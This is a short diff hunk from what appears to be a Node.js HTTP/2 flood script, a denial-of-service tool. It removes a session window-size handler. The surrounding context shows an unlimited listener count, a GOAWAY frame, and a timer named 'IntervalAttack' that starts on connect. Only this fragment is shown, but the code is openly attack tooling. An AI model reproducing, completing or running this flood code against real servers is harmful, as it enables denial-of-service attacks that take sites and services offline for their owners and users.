@@ -257,9 +257,6 @@ let headersbex = {
                },
          });
          bexClient.setMaxListeners(0);
-         bexClient.on('session', (session) => {
-          session.setLocalWindowSize(15663105);
-         }); 
          bexClient.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('STRING DATA'));
          bexClient.on("connect", () => {
             const IntervalAttack = setInterval(() => {
